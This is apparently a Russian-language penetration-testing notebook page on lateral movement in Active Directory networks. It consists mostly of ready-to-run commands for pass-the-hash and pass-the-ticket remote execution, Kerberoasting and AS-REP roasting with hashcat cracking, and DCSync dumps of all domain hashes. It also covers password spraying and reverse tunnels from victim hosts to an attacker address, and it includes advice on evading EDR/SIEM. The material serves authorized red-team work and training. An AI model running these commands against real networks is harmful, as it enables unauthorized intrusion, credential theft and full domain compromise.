#lateral-movement #pentest #corporate #activedirectory #pivoting

> Lateral Movement — фаза перемещения внутри сети после первоначального закрепления: захват новых хостов и сегментов с расширением доступа при минимальном шуме.

## Цель фазы

После получения первоначального foothold необходимо распространиться по сети: добраться до контроллеров домена, изолированных сегментов и привилегированных систем. Главный принцип — **двигаться боком**, используя легитимные протоколы и украденные учётные данные, чтобы не триггерить EDR/SIEM.

---

## 1. Pass-the-Hash (Windows)

Атака основана на том, что NTLM-аутентификация принимает хэш пароля напрямую — без знания самого пароля.

### Когда работает / не работает

| Условие | Результат |
|---|---|
| NTLM включён на целевом хосте | Работает |
| Учётная запись — локальный администратор | Работает (если не отключён через LocalAccountTokenFilterPolicy) |
| NTLMv2 с Extended Protection / EPA | Не работает напрямую, нужен relay |
| Protected Users group / Restricted Admin mode | Не работает |
| Целевой хост — DC, атака на KRBTGT | Не работает — требуется Kerberos |

### CrackMapExec — sweep по сети

```bash
# Проверка хэша по всей подсети
crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Только успешные (Pwn3d!)
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH> --continue-on-success

# Выполнение команды
crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM_HASH> -x "whoami /all"

# Дамп SAM через имперсонацию
crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM_HASH> --sam
```

### Impacket — удалённое исполнение

```bash
# psexec — создаёт сервис, шумный, но надёжный
impacket-psexec 'DOMAIN/Administrator@192.168.1.10' -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

# wmiexec — через WMI, без записи на диск, тише
impacket-wmiexec 'DOMAIN/Administrator@192.168.1.10' -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

# smbexec — через SMB shares, средний шум
impacket-smbexec 'DOMAIN/Administrator@192.168.1.10' -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

# atexec — через Task Scheduler, асинхронно
impacket-atexec 'DOMAIN/Administrator@192.168.1.10' -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> "whoami"
```

### Evil-WinRM — WinRM (порт 5985/5986)

```bash
# Подключение по хэшу
evil-winrm -i 192.168.1.10 -u Administrator -H <NTLM_HASH>

# С доменом
evil-winrm -i 192.168.1.10 -u 'DOMAIN\Administrator' -H <NTLM_HASH>

# Загрузка файла на хост
upload /local/path/payload.exe C:\Windows\Temp\payload.exe

# Загрузка файла с хоста
download C:\Windows\Temp\interesting.txt /local/path/
```

---

## 2. Pass-the-Ticket (Kerberos)

Атака на основе кражи или подделки Kerberos-тикетов (TGT/TGS). Позволяет аутентифицироваться без пароля и хэша.

### Получение TGT через Impacket

```bash
# Получить TGT по хэшу (Overpass-the-Hash)
impacket-getTGT DOMAIN/username -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

# Получить TGT по паролю
impacket-getTGT DOMAIN/username:Password123

# Результат: файл username.ccache
```

### Экспорт и использование тикета

```bash
# Указать путь к ccache-файлу
export KRB5CCNAME=/path/to/username.ccache

# Использовать тикет с psexec (без пароля/хэша)
impacket-psexec -k -no-pass DOMAIN/username@target.domain.local

# Использовать тикет с wmiexec
impacket-wmiexec -k -no-pass DOMAIN/username@target.domain.local

# Использовать тикет с smbclient
impacket-smbclient -k -no-pass DOMAIN/username@target.domain.local
```

### Overpass-the-Hash (NTLM → Kerberos TGT)

Суть: имея NTLM-хэш, получить полноценный Kerberos TGT, чтобы работать через Kerberos-протокол (обходит ограничения на NTLM).

```bash
# 1. Получить TGT из NTLM-хэша
impacket-getTGT DOMAIN/svc_account -hashes :NTLMhashHere -dc-ip 192.168.1.1

# 2. Экспортировать тикет
export KRB5CCNAME=svc_account.ccache

# 3. Действовать от имени сервисного аккаунта через Kerberos
impacket-wmiexec -k -no-pass DOMAIN/svc_account@dc01.domain.local
```

### Кража тикетов с живого хоста (требует доступ на хост)

```bash
# Через Mimikatz (на Windows-хосте)
# sekurlsa::tickets /export   — экспортирует .kirbi файлы
# Конвертация .kirbi → .ccache через impacket-ticketConverter

impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

---

## 3. Active Directory Attacks

### BloodHound

BloodHound визуализирует пути атаки в Active Directory через граф связей между объектами домена.

#### Сбор данных

```bash
# bloodhound-python — сбор с Linux без агента на хосте
pip install bloodhound

bloodhound-python -u 'username' -p 'Password123' -d domain.local -ns 192.168.1.1 -c All

# С хэшем
bloodhound-python -u 'username' --hashes aad3b435b51404eeaad3b435b51404ee:<NTLM> -d domain.local -ns 192.168.1.1 -c All

# Результат: несколько JSON-файлов (users, groups, computers, acls, ...)
```

#### Импорт в BloodHound UI

```bash
# Запустить Neo4j и BloodHound
sudo neo4j start
bloodhound &

# В UI: Upload Data → выбрать все JSON-файлы
# Или через drag-and-drop в интерфейс
```

#### Ключевые запросы в BloodHound

| Запрос | Что находит |
|---|---|
| Find Shortest Paths to Domain Admins | Кратчайший путь от текущего пользователя до DA |
| Find All Domain Admins | Все члены группы Domain Admins |
| List All Kerberoastable Accounts | Аккаунты с SPN — кандидаты для Kerberoasting |
| Find Principals with DCSync Rights | Кто может делать DCSync |
| Shortest Paths to Unconstrained Delegation Systems | Системы с неограниченным делегированием |
| Find AS-REP Roastable Users | Аккаунты без preauth |

#### Neo4j — ручные Cypher-запросы

```bash
# Все пути от текущего пользователя до DA
MATCH p=shortestPath((u:User {name:"USERNAME@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Все пользователи с правами AdminTo на хосты
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name

# Хосты с Unconstrained Delegation (кроме DC)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name
```

---

### Kerberoasting

Получение TGS-тикетов для сервисных аккаунтов (SPN) и их оффлайн-взлом. Не требует повышенных привилегий.

```bash
# Получить список SPN и запросить тикеты
impacket-GetUserSPNs DOMAIN/username:Password123 -dc-ip 192.168.1.1 -request

# С хэшем
impacket-GetUserSPNs DOMAIN/username -hashes :NTLM_HASH -dc-ip 192.168.1.1 -request

# Сохранить хэши в файл
impacket-GetUserSPNs DOMAIN/username:Password123 -dc-ip 192.168.1.1 -request -outputfile kerberoast_hashes.txt

# Взлом через hashcat (режим 13100 — Kerberos TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Импакт**: сервисные аккаунты часто имеют привилегии (SQL, IIS, backup) и слабые пароли. Взлом → повышение прав или DCSync.

---

### ASREPRoasting

Атака на аккаунты без обязательной Kerberos preauth. Можно запросить AS-REP без аутентификации.

```bash
# Найти уязвимые аккаунты и получить хэши (имея валидного пользователя)
impacket-GetNPUsers DOMAIN/username:Password123 -dc-ip 192.168.1.1 -request

# Без учётных данных (если знаем имена пользователей)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip 192.168.1.1

# Сохранить в файл
impacket-GetNPUsers DOMAIN/username:Password123 -dc-ip 192.168.1.1 -request -outputfile asrep_hashes.txt

# Взлом через hashcat (режим 18200 — Kerberos AS-REP)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

**Кто уязвим**: аккаунты с флагом `DONT_REQUIRE_PREAUTH` в `userAccountControl`. Часто встречается у legacy-сервисов и сервисных аккаунтов.

---

### DCSync (требует DA или права репликации)

Имитация контроллера домена для запроса репликации всех хэшей. Фактически — дамп всего домена.

```bash
# Через impacket-secretsdump (удалённо, не требует агента на DC)
impacket-secretsdump DOMAIN/DomainAdmin:Password@dc01.domain.local

# С хэшем
impacket-secretsdump DOMAIN/DomainAdmin@dc01.domain.local -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM>

# Только конкретный пользователь (тихо)
impacket-secretsdump DOMAIN/DomainAdmin:Password@dc01.domain.local -just-dc-user krbtgt

# Через Mimikatz на DC (если есть интерактивная сессия)
# lsadump::dcsync /domain:domain.local /user:krbtgt
# lsadump::dcsync /domain:domain.local /all /csv
```

**Результат**: хэши всех пользователей домена, включая KRBTGT → Golden Ticket, NT-хэши всех DA.

---

## 4. Pivoting / Tunneling

Необходимо для достижения изолированных сетевых сегментов (DMZ, внутренние VLAN, OT-сети), недоступных напрямую с машины атакующего.

### Chisel — SOCKS5 через HTTP

```bash
# На машине атакующего (сервер)
./chisel server -p 8080 --reverse --socks5

# На pivot-хосте (жертва, клиент)
./chisel client <ATTACKER_IP>:8080 R:socks

# proxychains для маршрутизации трафика
# /etc/proxychains4.conf:
# [ProxyList]
# socks5  127.0.0.1 1080

proxychains nmap -sT -Pn 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24 -u admin -p Password123
proxychains impacket-psexec DOMAIN/Admin:Password@10.10.10.5
```

### SSH Port Forwarding

```bash
# Dynamic forwarding (SOCKS proxy) — весь трафик через хост
ssh -D 1080 -N user@pivot-host

# Local forwarding — пробросить один порт
ssh -L 8445:internal-host:445 user@pivot-host

# Remote forwarding — reverse tunnel (если нет прямого доступа к pivot)
ssh -R 2222:localhost:22 attacker@<ATTACKER_IP>

# Через proxychains с SOCKS
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT 10.10.10.0/24
```

### Ligolo-ng — современный туннель через tun-интерфейс

Ligolo-ng создаёт реальный сетевой интерфейс (tun), позволяя работать с внутренними сетями напрямую без proxychains.

```bash
# На машине атакующего (proxy-сервер)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# На pivot-хосте (agent)
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# В консоли proxy после подключения агента:
# session           — выбрать сессию
# ifconfig          — посмотреть интерфейсы на pivot
# start             — запустить туннель

# Добавить маршрут к внутренней сети
sudo ip route add 10.10.10.0/24 dev ligolo

# Теперь напрямую без proxychains:
nmap -sV 10.10.10.0/24
crackmapexec smb 10.10.10.0/24 -u admin -p Password123
```

### Proxychains — конфигурация

```bash
# /etc/proxychains4.conf — основные настройки
# strict_chain       — цепочка строго по порядку
# dynamic_chain      — пропускать недоступные прокси
# quiet_mode         — меньше вывода

# Пример конфига для Chisel + дополнительного SOCKS:
# dynamic_chain
# [ProxyList]
# socks5 127.0.0.1 1080
# socks4 127.0.0.1 1081

# Сканирование через туннель (медленно — TCP connect scan)
proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 10.10.10.0/24

# RDP через туннель
proxychains xfreerdp /u:Administrator /p:Password123 /v:10.10.10.5
```

---

## 5. Credential Reuse

После нахождения учётных данных (пароль, хэш) — проверить их на всех обнаруженных хостах.

### Sweep по сети с найденными кредами

```bash
# SMB — самый распространённый
crackmapexec smb 192.168.1.0/24 -u 'username' -p 'Password123' --continue-on-success

# WinRM (порт 5985)
crackmapexec winrm 192.168.1.0/24 -u 'username' -p 'Password123'

# RDP (порт 3389)
crackmapexec rdp 192.168.1.0/24 -u 'username' -p 'Password123'

# SSH (порт 22)
crackmapexec ssh 192.168.1.0/24 -u 'username' -p 'Password123'

# Несколько пользователей из файла
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

### Password Spraying внутри сети

```bash
# Попробовать один пароль против всех пользователей (без блокировки)
crackmapexec smb 192.168.1.1 -u domain_users.txt -p 'Spring2024!' --continue-on-success

# Получить список пользователей домена
crackmapexec smb 192.168.1.1 -u 'username' -p 'Password123' --users

# Или через impacket
impacket-GetADUsers DOMAIN/username:Password123 -all -dc-ip 192.168.1.1

# Kerbrute — spray через Kerberos (не создаёт событий 4625, только 4771)
kerbrute passwordspray -d domain.local --dc 192.168.1.1 users.txt 'Spring2024!'
```

**Важно**: перед spray проверить политику блокировки аккаунтов (`net accounts /domain`) — типичный lockout threshold 5-10 попыток.

---

## 6. Инструменты

| Инструмент | Назначение | Оценка | Установка |
|---|---|---|---|
| **Impacket** | Полный suite: psexec, wmiexec, secretsdump, GetSPNs, GetNPUsers, getTGT | ⭐⭐⭐⭐⭐ | `pip install impacket` |
| **CrackMapExec** | Network sweeping, credential validation, SMB/WinRM/RDP/SSH | ⭐⭐⭐⭐⭐ | `pip install crackmapexec` |
| **Evil-WinRM** | WinRM shell с поддержкой hash, загрузкой файлов | ⭐⭐⭐⭐⭐ | `gem install evil-winrm` |
| **BloodHound + bloodhound-python** | AD graph attack paths, визуализация | ⭐⭐⭐⭐⭐ | `pip install bloodhound` |
| **Chisel** | TCP/SOCKS туннель через HTTP/HTTPS | ⭐⭐⭐⭐ | [GitHub releases](https://github.com/jpillora/chisel) |
| **Ligolo-ng** | Современный туннель через tun-интерфейс | ⭐⭐⭐⭐⭐ | [GitHub releases](https://github.com/nicocha30/ligolo-ng) |
| **Proxychains-ng** | Маршрутизация трафика через SOCKS/HTTP прокси | ⭐⭐⭐⭐ | `apt install proxychains4` |
| **Kerbrute** | Kerberos-based user enum и password spray | ⭐⭐⭐⭐ | [GitHub releases](https://github.com/opsec-infosec/kerbrute) |
| **Hashcat** | GPU-взлом хэшей (NTLM, Kerberos TGS/AS-REP) | ⭐⭐⭐⭐⭐ | `apt install hashcat` |

### Полезные ресурсы

| Ресурс | Описание | Оценка |
|---|---|---|
| [HackTricks - Lateral Movement](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/lateral-movement) | Обширная методология с примерами | ⭐⭐⭐⭐⭐ |
| [BloodHound Docs](https://bloodhound.readthedocs.io/) | Официальная документация BloodHound | ⭐⭐⭐⭐⭐ |
| [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples) | Все скрипты impacket с описанием | ⭐⭐⭐⭐⭐ |
| [ired.team - AD](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse) | Детальные writeup'ы Kerberos-атак | ⭐⭐⭐⭐⭐ |
| [Chisel GitHub](https://github.com/jpillora/chisel) | Исходники и релизы Chisel | ⭐⭐⭐⭐ |
| [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng) | Исходники и документация Ligolo-ng | ⭐⭐⭐⭐⭐ |

---

→ [[07 — Privilege Escalation]]
